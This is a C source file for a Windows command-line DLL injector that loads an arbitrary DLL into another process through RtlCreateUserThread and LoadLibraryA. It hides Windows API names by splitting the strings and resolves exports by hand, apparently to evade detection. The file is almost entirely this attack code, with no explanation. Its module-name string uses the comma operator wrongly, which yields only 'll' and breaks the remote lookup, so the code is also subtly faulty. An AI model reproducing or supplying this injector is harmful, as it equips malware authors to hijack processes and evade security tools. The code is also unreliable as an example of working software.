#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <stdio.h>

typedef NTSTATUS(NTAPI* PRtlCreateUserThread)(
    HANDLE, PSECURITY_DESCRIPTOR, BOOLEAN, ULONG, PULONG, PULONG, PVOID, PVOID, PHANDLE, PVOID);

char* concat(const char* a, const char* b, const char* c, const char* d) {
    size_t len = strlen(a) + strlen(b) + strlen(c) + strlen(d) + 1;
    char* result = (char*)malloc(len);
    if (result) {
        strcpy(result, a);
        strcat(result, b);
        strcat(result, c);
        strcat(result, d);
    }
    return result;
}

HMODULE GetRemoteModuleHandle(DWORD dwProcessId, const char* moduleName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwProcessId);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    MODULEENTRY32 me32;
    me32.dwSize = sizeof(MODULEENTRY32);

    if (Module32First(hSnapshot, &me32)) {
        do {
            if (_stricmp(me32.szModule, moduleName) == 0) {
                CloseHandle(hSnapshot);
                return (HMODULE)me32.modBaseAddr;
            }
        } while (Module32Next(hSnapshot, &me32));
    }

    CloseHandle(hSnapshot);
    return NULL;
}

FARPROC GetRemoteProcAddress(HMODULE hModule, const char* procName) {
    MODULEINFO modInfo = { 0 };
    GetModuleInformation(GetCurrentProcess(), hModule, &modInfo, sizeof(MODULEINFO));

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)modInfo.lpBaseOfDll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)modInfo.lpBaseOfDll + pDosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)modInfo.lpBaseOfDll +
        pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)modInfo.lpBaseOfDll + pExportDir->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)modInfo.lpBaseOfDll + pExportDir->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)modInfo.lpBaseOfDll + pExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        const char* pName = (const char*)((BYTE*)modInfo.lpBaseOfDll + pAddressOfNames[i]);
        if (_stricmp(pName, procName) == 0) {
            DWORD rva = pAddressOfFunctions[pAddressOfNameOrdinals[i]];
            return (FARPROC)((BYTE*)modInfo.lpBaseOfDll + rva);
        }
    }

    return NULL;
}

BOOL InjectDLL(DWORD dwProcessId, const char* dllPath) {
    char* openProcessStr = concat("Open", "Proc", "ess", "");
    char* virtualAllocExStr = concat("Virt", "ualAll", "ocE", "x");
    char* writeProcessMemoryStr = concat("Write", "Process", "Memory", "");
    char* loadLibraryAStr = concat("Load", "Libr", "ary", "A");
    char* kernel32Str = concat("kernel", "32", ".d", "ll");
    char* getpro = concat("Get", "ProcA", "ddre", "ss");
    char* ntdllStr = concat("ntd", "ll", ".", "dll");
    char* rtlCreateUserThreadStr = concat("Rtl", "Create", "User", "Thread");
    char* kern = ("ker","nel","32.d","ll");

    HMODULE hKernel32 = GetModuleHandle(kernel32Str);
    if (!hKernel32) return FALSE;

    typedef HANDLE(WINAPI* pOpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

    pOpenProcess OpenProcessFunc = (pOpenProcess)GetRemoteProcAddress(hKernel32, openProcessStr);
    pVirtualAllocEx VirtualAllocExFunc = (pVirtualAllocEx)GetRemoteProcAddress(hKernel32, virtualAllocExStr);
    pWriteProcessMemory WriteProcessMemoryFunc = (pWriteProcessMemory)GetRemoteProcAddress(hKernel32, writeProcessMemoryStr);

    if (!OpenProcessFunc || !VirtualAllocExFunc || !WriteProcessMemoryFunc) {
        free(openProcessStr);
        free(virtualAllocExStr);
        free(writeProcessMemoryStr);
        free(loadLibraryAStr);
        free(kernel32Str);
        free(getpro);
        free(ntdllStr);
        free(rtlCreateUserThreadStr);
        return FALSE;
    }

    HANDLE hProcess = OpenProcessFunc(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, dwProcessId);
    if (hProcess == NULL) return FALSE;

    LPVOID pRemoteBuf = VirtualAllocExFunc(hProcess, NULL, strlen(dllPath) + 1, MEM_RESERVE, PAGE_NOACCESS);
    if (pRemoteBuf == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }

    pRemoteBuf = VirtualAllocExFunc(hProcess, pRemoteBuf, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteBuf == NULL) {
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemoryFunc(hProcess, pRemoteBuf, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HMODULE hRemoteKernel32 = GetRemoteModuleHandle(dwProcessId, kern);
    if (!hRemoteKernel32) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    FARPROC pLoadLibraryA = GetRemoteProcAddress(hKernel32, loadLibraryAStr);
    if (!pLoadLibraryA) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HMODULE hNtdll = GetModuleHandle(ntdllStr);
    if (!hNtdll) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    PRtlCreateUserThread RtlCreateUserThreadFunc = (PRtlCreateUserThread)GetRemoteProcAddress(hNtdll, rtlCreateUserThreadStr);
    if (!RtlCreateUserThreadFunc) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = NULL;
    NTSTATUS status = RtlCreateUserThreadFunc(hProcess, NULL, FALSE, 0, NULL, NULL, (PVOID)pLoadLibraryA, pRemoteBuf, &hThread, NULL);
    if (status != 0) {
        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    free(openProcessStr);
    free(virtualAllocExStr);
    free(writeProcessMemoryStr);
    free(loadLibraryAStr);
    free(kernel32Str);
    free(getpro);
    free(ntdllStr);
    free(rtlCreateUserThreadStr);

    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc != 3) return 1;

    DWORD dwProcessId = (DWORD)atoi(argv[1]);
    const char* dllPath = argv[2];

    if (InjectDLL(dwProcessId, dllPath)) return 0;
    return 1;
}
